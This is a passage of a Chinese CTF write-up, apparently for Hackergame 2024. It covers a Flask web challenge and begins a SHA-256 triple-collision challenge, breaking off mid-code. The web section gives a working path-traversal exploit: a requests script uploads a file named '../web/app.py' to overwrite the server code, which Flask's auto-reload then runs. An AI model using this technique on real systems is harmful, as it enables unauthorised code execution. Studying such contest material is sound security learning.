href="https://github.com/USTC-Hackergame/hackergame2024-writeups/raw/refs/heads/master/official/%E7%A6%81%E6%AD%A2%E5%86%85%E5%8D%B7/src/web/app.py">题目源代码</a></p><p>提示：助教部署的时候偷懒了，直接用了 <code>flask run</code>（当然了，助教也读过 Flask 的文档，所以 DEBUG 是关了的）。而且有的时候助教想改改代码，又懒得手动重启，所以还开了 <code>--reload</code>。启动的完整命令为 <code>flask run --reload --host 0</code>。网站代码运行在 <code>/tmp/web</code>。</p></div></div></details><p>不知道为啥这题一开始做的人那么少，害得我一直没去看。后来看了一眼，发现极其送分，从开始看源代码到拿到flag，应该不超过10分钟。</p><p>源代码如下：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> render_template<span class="token punctuation">,</span> request<span class="token punctuation">,</span> flash<span class="token punctuation">,</span> redirect<span class="token punctuation">,</span> jsonify<span class="token keyword">import</span> json<span class="token keyword">import</span> os<span class="token keyword">import</span> traceback<span class="token keyword">import</span> secretsapp <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>app<span class="token punctuation">.</span>secret_key <span class="token operator">=</span> secrets<span class="token punctuation">.</span>token_urlsafe<span class="token punctuation">(</span><span class="token number">64</span><span class="token punctuation">)</span>UPLOAD_DIR <span class="token operator">=</span> <span class="token string">"/tmp/uploads"</span>os<span class="token punctuation">.</span>makedirs<span class="token punctuation">(</span>UPLOAD_DIR<span class="token punctuation">,</span> exist_ok<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span class="token comment"># results is a list</span><span class="token keyword">try</span><span class="token punctuation">:</span>    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"results.json"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>        results <span class="token operator">=</span> json<span class="token punctuation">.</span>load<span class="token punctuation">(</span>f<span class="token punctuation">)</span><span class="token keyword">except</span> FileNotFoundError<span class="token punctuation">:</span>    results <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"results.json"</span><span class="token punctuation">,</span> <span class="token string">"w"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>        json<span class="token punctuation">.</span>dump<span class="token punctuation">(</span>results<span class="token punctuation">,</span> f<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">get_answer</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment"># scoring with answer</span>    <span class="token comment"># I could change answers anytime so let's just load it every time</span>    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"answers.json"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>        answers <span class="token operator">=</span> json<span class="token punctuation">.</span>load<span class="token punctuation">(</span>f<span class="token punctuation">)</span>        <span class="token comment"># sanitize answer</span>        <span class="token keyword">for</span> idx<span class="token punctuation">,</span> i <span class="token keyword">in</span> <span class="token builtin">enumerate</span><span class="token punctuation">(</span>answers<span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> i <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">:</span>                answers<span class="token punctuation">[</span>idx<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span>    <span class="token keyword">return</span> answers<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">"/"</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">"GET"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">"index.html"</span><span class="token punctuation">,</span> results<span class="token operator">=</span><span class="token builtin">sorted</span><span class="token punctuation">(</span>results<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">"/submit"</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">"POST"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">submit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> <span class="token string">"file"</span> <span class="token keyword">not</span> <span class="token keyword">in</span> request<span class="token punctuation">.</span>files <span class="token keyword">or</span> request<span class="token punctuation">.</span>files<span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>filename <span class="token operator">==</span> <span class="token string">""</span><span class="token punctuation">:</span>        flash<span class="token punctuation">(</span><span class="token string">"你忘了上传文件"</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> redirect<span class="token punctuation">(</span><span class="token string">"/"</span><span class="token punctuation">)</span>    <span class="token builtin">file</span> <span class="token operator">=</span> request<span class="token punctuation">.</span>files<span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span>    filename <span class="token operator">=</span> <span class="token builtin">file</span><span class="token punctuation">.</span>filename    filepath <span class="token operator">=</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>join<span class="token punctuation">(</span>UPLOAD_DIR<span class="token punctuation">,</span> filename<span class="token punctuation">)</span>    <span class="token builtin">file</span><span class="token punctuation">.</span>save<span class="token punctuation">(</span>filepath<span class="token punctuation">)</span>    answers <span class="token operator">=</span> get_answer<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span>filepath<span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>            user <span class="token operator">=</span> json<span class="token punctuation">.</span>load<span class="token punctuation">(</span>f<span class="token punctuation">)</span>    <span class="token keyword">except</span> json<span class="token punctuation">.</span>decoder<span class="token punctuation">.</span>JSONDecodeError<span class="token punctuation">:</span>        flash<span class="token punctuation">(</span><span class="token string">"你提交的好像不是 JSON"</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> redirect<span class="token punctuation">(</span><span class="token string">"/"</span><span class="token punctuation">)</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        score <span class="token operator">=</span> <span class="token number">0</span>        <span class="token keyword">for</span> idx<span class="token punctuation">,</span> i <span class="token keyword">in</span> <span class="token builtin">enumerate</span><span class="token punctuation">(</span>answers<span class="token punctuation">)</span><span class="token punctuation">:</span>            score <span class="token operator">+=</span> <span class="token punctuation">(</span>i <span class="token operator">-</span> user<span class="token punctuation">[</span>idx<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token punctuation">(</span>i <span class="token operator">-</span> user<span class="token punctuation">[</span>idx<span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">except</span><span class="token punctuation">:</span>        flash<span class="token punctuation">(</span><span class="token string">"分数计算出现错误"</span><span class="token punctuation">)</span>        traceback<span class="token punctuation">.</span>print_exc<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> redirect<span class="token punctuation">(</span><span class="token string">"/"</span><span class="token punctuation">)</span>    <span class="token comment"># ok, update results</span>    results<span class="token punctuation">.</span>append<span class="token punctuation">(</span>score<span class="token punctuation">)</span>    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"results.json"</span><span class="token punctuation">,</span> <span class="token string">"w"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>        json<span class="token punctuation">.</span>dump<span class="token punctuation">(</span>results<span class="token punctuation">,</span> f<span class="token punctuation">)</span>    flash<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"评测成功，你的平方差为 </span><span class="token interpolation"><span class="token punctuation">&#123;</span>score<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>    <span class="token keyword">return</span> redirect<span class="token punctuation">(</span><span class="token string">"/"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>花里胡哨的算分功能，根本不用看，只要意识到在<code>/submit</code>接口有一个路径穿越漏洞就行了，因为它是用<code>os.path.join</code>来拼接路径的，所以我们就可以上传一个文件名类似于<code>../../balabala</code>这种，我们就基本可以想上传到哪就上传到哪。</p><p>注意到题目告诉了我们：网站代码运行在 <code>/tmp/web</code>，而且他甚至还开了<code>--reload</code>。既然网站是用<code>flask</code>写的，那我盲猜一波主文件在<code>/tmp/web/app.py</code>，而我们上传的路径在<code>/tmp/uploads</code>，所以我们直接上传一个文件<code>../web/app.py</code>，这个操作则可以用<code>requests</code>实现：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requestsurl <span class="token operator">=</span> <span class="token string">'https://chal02-drfrs8jw.hack-challenge.lug.ustc.edu.cn:8443/'</span><span class="token builtin">file</span> <span class="token operator">=</span> <span class="token string">'backend.py'</span><span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token builtin">file</span><span class="token punctuation">,</span> <span class="token string">'rb'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>    files <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">'file'</span><span class="token punctuation">:</span> <span class="token punctuation">(</span><span class="token string">'../web/app.py'</span><span class="token punctuation">,</span> f<span class="token punctuation">)</span><span class="token punctuation">&#125;</span>    response <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url <span class="token operator">+</span> <span class="token string">'submit'</span><span class="token punctuation">,</span> files<span class="token operator">=</span>files<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>而<code>backend.py</code>文件中，我们就可以去写拿flag的逻辑了，比如把index路径的请求改了：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">"/"</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">"GET"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"answers.json"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>        answers <span class="token operator">=</span> json<span class="token punctuation">.</span>load<span class="token punctuation">(</span>f<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">100</span><span class="token punctuation">]</span>    ascii_answers <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span>num <span class="token operator">+</span> <span class="token number">65</span><span class="token punctuation">)</span> <span class="token keyword">for</span> num <span class="token keyword">in</span> answers <span class="token keyword">if</span> <span class="token builtin">isinstance</span><span class="token punctuation">(</span>num<span class="token punctuation">,</span> <span class="token builtin">int</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> ascii_answers    <span class="token comment"># return render_template("index.html", results=sorted(results))</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这样访问网站根路径就可以直接拿到flag。</p><h2 id="哈希三碰撞"><a href="#哈希三碰撞" class="headerlink" title="哈希三碰撞"></a>哈希三碰撞</h2><details class="toggle" ><summary class="toggle-button" style="">查看题面</summary><div class="toggle-content"><div class="note primary simple"><blockquote><p>以下内容包含 AI 辅助创作</p></blockquote><p>「太奇怪了！」小 Z 盯着显示器愁眉不展。</p><p>作为一名密码学家，小 Z 一直为自己能轻松找出哈希碰撞而自豪。毕竟在密码学的江湖中，找到两个不同的字符串却产生相同的哈希值，这种本事可不是人人都有的。</p><p>但今天，小 Z 遇到了一个前所未有的挑战。</p><p>「找到两个碰撞就像找到双胞胎，」小 Z 自言自语，「可是现在，我需要找到三胞胎？！」</p><p>是的，在这个平行宇宙中，仅仅找到两个碰撞已经不够刺激了。作为一名合格的哈希碰撞猎人，你必须找到三个不同的字符串，它们在经过哈希计算后会产生相同的值。</p><p>「双胞胎在自然界尚且常见，三胞胎可就是凤毛麟角了。」小 Z 叹了口气。</p><p>你能帮助小 Z 找到这个传说中的三碰撞吗？</p><p>「在密码学的世界里，两个是巧合，三个才是艺术。」</p><blockquote><p>AI 辅助创作部分结束</p></blockquote><p><a href="https://github.com/USTC-Hackergame/hackergame2024-writeups/blob/master/official/%E5%93%88%E5%B8%8C%E4%B8%89%E7%A2%B0%E6%92%9E/files/hashcol3.zip">本题附件</a></p></div></div></details><h3 id="三碰撞之一"><a href="#三碰撞之一" class="headerlink" title="三碰撞之一"></a>三碰撞之一</h3><p>最后一个比赛日的晚上，看这题做的人比较多，我也来试试吧！</p><p>用ida打开此题的文件：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> __cdecl <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>envp<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">int</span> i<span class="token punctuation">;</span> <span class="token comment">// [rsp+8h] [rbp-F8h]</span>  <span class="token keyword">int</span> j<span class="token punctuation">;</span> <span class="token comment">// [rsp+Ch] [rbp-F4h]</span>  <span class="token keyword">int</span> k<span class="token punctuation">;</span> <span class="token comment">// [rsp+10h] [rbp-F0h]</span>  <span class="token keyword">int</span> c<span class="token punctuation">;</span> <span class="token comment">// [rsp+14h] [rbp-ECh]</span>  FILE <span class="token operator">*</span>stream<span class="token punctuation">;</span> <span class="token comment">// [rsp+18h] [rbp-E8h]</span>  <span class="token keyword">int</span> v9<span class="token punctuation">;</span> <span class="token comment">// [rsp+24h] [rbp-DCh]</span>  <span class="token keyword">int</span> v10<span class="token punctuation">;</span> <span class="token comment">// [rsp+28h] [rbp-D8h]</span>  <span class="token keyword">int</span> v11<span class="token punctuation">;</span> <span class="token comment">// [rsp+2Ch] [rbp-D4h]</span>  _QWORD v12<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+30h] [rbp-D0h] BYREF</span>  <span class="token keyword">char</span> s1<span class="token punctuation">[</span><span class="token number">17</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+50h] [rbp-B0h] BYREF</span>  <span class="token keyword">char</span> v14<span class="token punctuation">[</span><span class="token number">17</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+61h] [rbp-9Fh] BYREF</span>  <span class="token keyword">char</span> v15<span class="token punctuation">[</span><span class="token number">134</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+72h] [rbp-8Eh] BYREF</span>  <span class="token keyword">unsigned</span> __int64 v16<span class="token punctuation">;</span> <span class="token comment">// [rsp+F8h] [rbp-8h]</span>  __int64 savedregs<span class="token punctuation">;</span> <span class="token comment">// [rsp+100h] [rbp+0h] BYREF</span>  v16 <span class="token operator">=</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">setvbuf</span><span class="token punctuation">(</span>_bss_start<span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> <span class="token number">2</span><span class="token punctuation">;</span> <span class="token operator">++</span>i <span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Data %d:"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token function">__isoc99_scanf</span><span class="token punctuation">(</span><span class="token string">"%16s"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>s1<span class="token punctuation">[</span><span class="token number">17</span> <span class="token operator">*</span> i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">1</span>      <span class="token operator">||</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token function">hex_to_bin</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>s1<span class="token punctuation">[</span><span class="token number">17</span> <span class="token operator">*</span> i<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>__int64<span class="token punctuation">)</span><span class="token operator">&amp;</span>v12<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">8uLL</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>      <span class="token function">fwrite</span><span class="token punctuation">(</span><span class="token string">"Invalid input\n"</span><span class="token punctuation">,</span> <span class="token number">1uLL</span><span class="token punctuation">,</span> <span class="token number">0xEuLL</span><span class="token punctuation">,</span> <span class="token constant">stderr</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span><span class="token function">strcmp</span><span class="token punctuation">(</span>s1<span class="token punctuation">,</span> v14<span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token operator">!</span><span class="token function">strcmp</span><span class="token punctuation">(</span>s1<span class="token punctuation">,</span> v15<span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token operator">!</span><span class="token function">strcmp</span><span class="token punctuation">(</span>v14<span class="token punctuation">,</span> v15<span class="token punctuation">)</span> <span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Input should be different"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">for</span> <span class="token punctuation">(</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;=</span> <span class="token number">2</span><span class="token punctuation">;</span> <span class="token operator">++</span>j <span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>    <span class="token function">SHA256</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>v12<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">8LL</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>v15<span class="token punctuation">[</span><span class="token number">32</span> <span class="token operator">*</span> j <span class="token operator">+</span> <span class="token number">30</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token operator">*</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>v9 <span class="token operator">+</span> j<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span> k <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> k <span class="token operator">&lt;=</span> <span class="token number">3</span><span class="token punctuation">;</span> <span class="token operator">++</span>k <span class="token punctuation">)</span>      <span class="token operator">*</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>v9 <span class="token operator">+</span> j<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> __int8 <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>savedregs <span class="token operator">+</span> <span class="token number">32</span> <span class="token operator">*</span> j <span class="token operator">+</span> k <span class="token operator">-</span> <span class="token number">84</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>v9 <span class="token operator">+</span> j<span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> v9 <span class="token operator">==</span> v10 <span class="token operator">&amp;&amp;</span> v10 <span class="token operator">==</span> v11 <span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>    stream <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string">"flag1"</span><span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span>stream <span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>      <span class="token function">fwrite</span><span class="token punctuation">(</span><span class="token string">"Can't open file\n"</span><span class="token punctuation">,</span> <span class="token number">1uLL</span><span class="token punctuation">,</span> <span class="token number">0x10uLL</span><span class="token punctuation">,</span> <span class="token constant">stderr</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span> <span class="token number">1</span> <span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>      c <span class="token operator">=</span> <span class="token function">fgetc</span><span class="token punctuation">(</span>stream<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span> c <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span> <span class="token punctuation">)</span>        <span class="token keyword">break</span><span class="token punctuation">;</span>      <span class="token function">putchar</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">fclose</span><span class="token punctuation">(</span>stream<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">else</span>  <span class="token punctuation">&#123;</span>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Wrong answer"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>但我不太熟悉C语言，这代码看的是真头大。好在一顿分析，我写出了等价的Python代码：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> random<span class="token keyword">from</span> hashlib <span class="token keyword">import</span> sha256hexes <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'abcd1234efefcaca'</span><span class="token punctuation">,</span> <span class="token string">'deadbeefdeadbeef'</span><span class="token punctuation">,</span> <span class="token string">'123a4367deadbeef'</span><span class="token punctuation">]</span>v12 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token builtin">bytes</span><span class="token punctuation">.</span>fromhex<span class="token punctuation">(</span>_<span class="token punctuation">)</span> <span class="token keyword">for</span> _ <span class="token keyword">in</span> hexes<span class="token punctuation">]</span><span class="token keyword">print</span><span class="token punctuation">(</span>v12<span class="token punctuation">)</span>ans <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">]</span>  <span class="token comment"># v9 v10 v11</span>v15 <span class="token operator">=</span> <span class="token builtin">bytearray</span><span class="token punctuation">(</span><span class="token string">b'\x00'</span> <span class="token operator">*</span> <span class="token number">30</span><span class="token punctuation">)</span>  <span class="token comment"># -142 -> -8</span><span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    v15<span class="token punctuation">.</span>extend<span class="token punctuation">(</span>sha256<span class="token punctuation">(</span>v12<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">.</span>digest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> k <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        ans<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> v15<span class="token punctuation">[</span><span class="token number">58</span> <span class="token operator">+</span> <span class="token number">32</span> <span class="token operator">*</span> j <span class="token operator">+</span> k<span class="token punctuation">]</span> <span class="token operator">|</span> <span class="token punctuation">(</span>ans<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">&lt;&lt;</span> <span class="token number">8</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>v15<span class="token punctuation">[</span><span class="token number">58</span> <span class="token operator">+</span> <span class="token number">32</span> <span class="token operator">*</span> j <span class="token operator">+</span> k<span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'</span><span class="token interpolation"><span class="token punctuation">&#123;</span>j<span class="token operator">=</span><span class="token punctuation">&#125;</span></span><span class="token string">,</span><span class="token interpolation"><span class="token punctuation">&#123;</span>ans<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token operator">=</span><span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这样看就清晰多了，我们其实只要碰撞<code>sha256</code>的最后4个字节就行了，这平均也就只需要碰撞256 ** 4次，似乎是可接受的。</p><p>不过这如果用 Python 来写，估计得跑到猴年马月。于是我（在GPT的辅助下）写了个C程序：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;openssl/sha.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;time.h></span></span><span class="token keyword">void</span> <span class="token function">bytes_to_hex</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">unsigned</span> <span class="token keyword">char</span> <span class="token operator">*</span>bytes<span class="token punctuation">,</span> <span 